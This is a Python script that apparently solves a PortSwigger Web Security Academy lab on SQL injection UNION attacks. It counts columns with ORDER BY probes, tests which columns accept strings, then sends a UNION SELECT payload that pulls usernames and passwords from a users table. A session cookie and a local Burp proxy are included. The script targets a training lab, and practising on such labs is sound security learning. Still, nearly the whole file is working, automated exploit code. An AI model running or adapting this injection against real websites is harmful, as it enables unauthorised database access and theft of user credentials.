import requests

burp0_url = "https://ac641f671f7ac7bec0810fac00ce00c1.web-security-academy.net:443/filter?category=Accessories"
burp0_cookies = {"session": "28CszTmOH6RTsF32DyffKQCT42KRSIHe"}
burp0_headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Dnt": "1", "Referer": "https://ac641f671f7ac7bec0810fac00ce00c1.web-security-academy.net/filter?category=Accessories", "Upgrade-Insecure-Requests": "1", "Sec-Fetch-Dest": "document", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-User": "?1", "Sec-Gpc": "1", "Te": "trailers", "Connection": "close"}
# requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies)

# lab: https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-multiple-values-in-single-column


cookies = burp0_cookies
headers = burp0_headers
number_of_columns = 0
table = "Users"
value = "username,+password"

def send_request_order_by(number: int):
    url = burp0_url + f"'+ORDER+BY+{number}--+-"
    # print(url)
    response = requests.get(url, headers=headers, cookies=cookies, proxies={"http": "http://127.0.0.1:8080"})
    # print(response)
    if response.status_code == 200:
        return True
    else:
        return False


def send_payload(number_of_columns, burp0_url):
    nulllist = []
    for i in range(number_of_columns):
        nulllist.append('NULL')

    for ii in range(number_of_columns):
        nulllist[ii] = "'test'"
        payload_var = ",".join(nulllist)
        print(payload_var)
        sqli_payload = f"'+UNION+SELECT+{payload_var}+FROM+{table}--+-"
        loaded_url = str(burp0_url + sqli_payload)
        # print(loaded_url)
        response = requests.get(loaded_url, headers=headers, cookies=cookies, proxies={"http": "http://127.0.0.1:8080"})
        # print(response)
        if response.status_code == 200:
            print("String field verified")    
        nulllist[ii] = "NULL"
    #stage 3:
    final_sqli_payload = f"'+UNION+SELECT+{value}+FROM+{table}--+-"
    loaded_url = str(burp0_url + final_sqli_payload)
    response = requests.get(loaded_url, headers=headers, cookies=cookies, proxies={"http": "http://127.0.0.1:8080"})
    # print(response.content)
    print(f"this is your payload:\n {final_sqli_payload}")


if __name__ == '__main__':
    for i in range(4, 0, -1):
        print(f"trying {i}")
        if send_request_order_by(i):
            number_of_columns = i
            print(f"stage 1 complete: number of columns to UNION BY:\n***   {i}    ***.\nstage 2 startin:")
            break
    send_payload(number_of_columns, burp0_url)





# PayLoad:
# '+UNION+SELECT+username,+password+FROM+users--
